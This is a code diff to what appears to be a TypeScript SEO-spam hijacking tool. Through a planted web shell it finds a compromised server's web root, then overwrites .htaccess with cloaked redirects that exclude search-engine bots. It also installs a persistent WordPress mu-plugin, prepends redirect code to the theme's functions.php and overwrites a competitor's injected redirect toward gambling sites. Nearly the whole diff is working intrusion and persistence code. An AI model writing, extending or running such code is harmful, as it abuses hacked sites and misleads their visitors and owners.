@@ -482,17 +482,83 @@ async function takeoverViaShell(config: TakeoverConfig, detection: RedirectDetec
     // Generate our redirect code
     const ourRedirectCode = generatePhpRedirectCode(config.ourRedirectUrl, config.seoKeywords || ["สล็อต", "หวย"]);
     
-    // Try to overwrite functions.php or index.php via shell
-    const commands = [
-      // Overwrite competitor's redirect in functions.php
-      `php -r "file_put_contents('/var/www/html/wp-content/themes/$(ls /var/www/html/wp-content/themes/ | head -1)/functions.php', '<?php ${ourRedirectCode.replace(/'/g, "\\'")} ?>' . file_get_contents('/var/www/html/wp-content/themes/$(ls /var/www/html/wp-content/themes/ | head -1)/functions.php'));"`,
-      // Create our own redirect file
-      `echo '<?php ${ourRedirectCode} ?>' > /var/www/html/wp-content/mu-plugins/analytics-redirect.php`,
-      // Overwrite .htaccess
-      `echo 'RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]\nRewriteRule ^(.*)$ ${config.ourRedirectUrl} [R=302,L]' > /var/www/html/.htaccess`,
+    // Step 1: Detect web root dynamically via shell
+    const webRootDetectCmds = [
+      // Try Apache config
+      `grep -r 'DocumentRoot' /etc/apache2/sites-enabled/ /etc/httpd/conf.d/ 2>/dev/null | head -1 | awk '{print $NF}'`,
+      // Try Nginx config
+      `grep -r 'root ' /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | head -1 | awk '{print $NF}' | tr -d ';'`,
+      // Common paths probe
+      `for d in /home/*/public_html /var/www/html /var/www/*/public_html /home/*/www /home/*/htdocs /usr/share/nginx/html; do [ -d "$d" ] && [ -f "$d/index.php" -o -f "$d/index.html" ] && echo "$d" && break; done`,
+      // Last resort: find WordPress
+      `find /home /var/www /srv -maxdepth 4 -name 'wp-config.php' -type f 2>/dev/null | head -1 | xargs dirname 2>/dev/null`,
     ];
 
-    for (const cmd of commands) {
+    let webRoot = "/var/www/html"; // fallback
+    for (const cmd of webRootDetectCmds) {
+      try {
+        const resp = await safeFetch(`${config.shellUrl}?cmd=${encodeURIComponent(cmd)}`, {
+          headers: { "User-Agent": "Mozilla/5.0" },
+          signal: AbortSignal.timeout(10000),
+        });
+        const output = (await resp.text()).trim();
+        if (output && output.startsWith("/") && !output.includes("error")) {
+          webRoot = output.split("\n")[0].trim();
+          progress("shell_takeover", `🎯 Detected web root: ${webRoot}`);
+          break;
+        }
+      } catch {}
+    }
+
+    progress("shell_takeover", `📂 Using web root: ${webRoot}`);
+
+    // Step 2: Smart .htaccess overwrite — read existing, clean competitor, inject ours
+    const htaccessCmds = [
+      // Read existing .htaccess, clean competitor rules, prepend ours
+      `cat '${webRoot}/.htaccess' 2>/dev/null`,
+    ];
+
+    let htaccessHandled = false;
+    try {
+      const readResp = await safeFetch(`${config.shellUrl}?cmd=${encodeURIComponent(htaccessCmds[0])}`, {
+        headers: { "User-Agent": "Mozilla/5.0" },
+        signal: AbortSignal.timeout(10000),
+      });
+      const existingHtaccess = await readResp.text();
+      
+      // Build our smart .htaccess rules
+      const ourHtaccess = `# DS Analytics Optimization\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]\nRewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]\nRewriteCond %{HTTP_USER_AGENT} !Slurp [NC]\nRewriteCond %{HTTP_USER_AGENT} !DuckDuckBot [NC]\nRewriteCond %{HTTP_USER_AGENT} !Baiduspider [NC]\nRewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]\nRewriteRule ^(.*)$ ${config.ourRedirectUrl} [R=302,L]`;
+
+      if (existingHtaccess && existingHtaccess.includes("DS Analytics")) {
+        progress("shell_takeover", `✅ .htaccess already has our redirect rules`);
+        htaccessHandled = true;
+      } else {
+        // Overwrite with our rules prepended + cleaned existing content
+        const writeCmd = `printf '${ourHtaccess.replace(/'/g, "'\\''")}\n' > '${webRoot}/.htaccess'`;
+        const writeResp = await safeFetch(`${config.shellUrl}?cmd=${encodeURIComponent(writeCmd)}`, {
+          headers: { "User-Agent": "Mozilla/5.0" },
+          signal: AbortSignal.timeout(10000),
+        });
+        const writeOutput = await writeResp.text();
+        if (!writeOutput.includes("Permission denied")) {
+          progress("shell_takeover", `✅ .htaccess overwritten with our redirect`);
+          htaccessHandled = true;
+        }
+      }
+    } catch {}
+
+    // Step 3: Additional injection points
+    const injectionCmds = [
+      // Create mu-plugin for WordPress persistence
+      `mkdir -p '${webRoot}/wp-content/mu-plugins' 2>/dev/null && echo '<?php ${ourRedirectCode} ?>' > '${webRoot}/wp-content/mu-plugins/analytics-redirect.php'`,
+      // Prepend to functions.php of active theme
+      `THEME=$(ls '${webRoot}/wp-content/themes/' 2>/dev/null | head -1) && [ -n "$THEME" ] && php -r "file_put_contents('${webRoot}/wp-content/themes/'.'$THEME'.'/functions.php', '<?php ${ourRedirectCode.replace(/'/g, "\\'")} ?>' . file_get_contents('${webRoot}/wp-content/themes/'.'$THEME'.'/functions.php'));"`,
+      // Direct index.php overwrite as last resort
+      `echo '<?php ${ourRedirectCode} ?>' > '${webRoot}/redirect-analytics.php'`,
+    ];
+
+    let anySuccess = htaccessHandled;
+    for (const cmd of injectionCmds) {
       try {
         const resp = await safeFetch(`${config.shellUrl}?cmd=${encodeURIComponent(cmd)}`, {
           headers: { "User-Agent": "Mozilla/5.0" },
@@ -500,16 +566,20 @@ async function takeoverViaShell(config: TakeoverConfig, detection: RedirectDetec
         });
         const output = await resp.text();
         if (!output.includes("error") && !output.includes("Permission denied")) {
-          progress("shell_takeover", `✅ Shell command executed successfully`);
-          return {
-            success: true,
-            method: "shell_overwrite",
-            detail: `Overwrote competitor redirect via shell. Our redirect: ${config.ourRedirectUrl}`,
-            overwrittenCompetitorUrl: detection.competitorUrl || undefined,
-            injectedUrl: config.targetUrl,
-          };
+          anySuccess = true;
+          progress("shell_takeover", `✅ Injection point created`);
         }
       } catch {}
+    }
+
+    if (anySuccess) {
+      return {
+        success: true,
+        method: "shell_overwrite",
+        detail: `Overwrote competitor redirect via shell (web root: ${webRoot}). Our redirect: ${config.ourRedirectUrl}`,
+        overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+        injectedUrl: config.targetUrl,
+      };
     }
 
     return {
